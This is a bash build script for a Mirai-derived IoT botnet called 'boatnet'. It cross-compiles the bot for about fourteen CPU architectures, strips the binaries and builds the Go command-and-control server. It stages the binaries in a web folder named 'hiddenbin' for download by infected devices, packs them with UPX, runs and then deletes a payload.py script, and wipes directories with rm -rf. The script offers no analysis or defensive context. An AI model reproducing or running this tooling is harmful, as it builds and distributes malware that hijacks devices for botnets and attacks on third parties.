#!/bin/bash
echo "Export bin"
export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i486/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/x86_64/bin
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

# Compile Setting
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function compile_bot_arm7 {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

function arc_compile {
    "$1-linux-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-linux-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}


rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
mkdir /var/www/html
mkdir /var/www/html/hiddenbin
go build -o newmain cnc/*.go
rm -rf ~/cnc

echo "Building - x86-DEBUG"
compile_bot i586 boatnet.x86-DEBUG "-static -DUSEDOMAIN -DDEBUG"
echo "Building - x86"
compile_bot i586 boatnet.x86 "-static -DUSEDOMAIN"
echo "Building - x86_64"
compile_bot i586 boatnet.x86_64 "-static -DUSEDOMAIN"
echo "Building - mips"
compile_bot mips boatnet.mips "-static -DUSEDOMAIN"
echo "Building - mipsel"
compile_bot mipsel boatnet.mpsl "-static -DUSEDOMAIN"
echo "Building - armv4l"
compile_bot armv4l boatnet.arm "-static -DUSEDOMAIN"
echo "Building - armv5l"
compile_bot armv5l boatnet.arm5 "-DUSEDOMAIN"
echo "Building - armv6l"
compile_bot armv6l boatnet.arm6 "-static -DUSEDOMAIN"
echo "Building - armv7l"
compile_bot_arm7 armv7l boatnet.arm7 "-static -DUSEDOMAIN"
echo "Building - powerpc"
compile_bot powerpc boatnet.ppc "-static -DUSEDOMAIN"
echo "Building - sparc"
compile_bot sparc boatnet.spc "-static -DUSEDOMAIN"
echo "Building - m68k"
compile_bot m68k boatnet.m68k "-static -DUSEDOMAIN"
echo "Building - sh4"
compile_bot sh4 boatnet.sh4 "-static -DUSEDOMAIN"
echo "Building - arc"
arc_compile arc boatnet.arc "-static -DUSEDOMAIN"

cp release/boatnet.* /var/www/html/hiddenbin
rm -rf release

wget https://github.com/upx/upx/releases/download/v3.94/upx-3.94-i386_linux.tar.xz
tar -xvf *.xz
mv upx*/upx .
./upx --ultra-brute /var/www/html/hiddenbin/*
rm -rf upx*
python3 payload.py
rm -rf payload.py
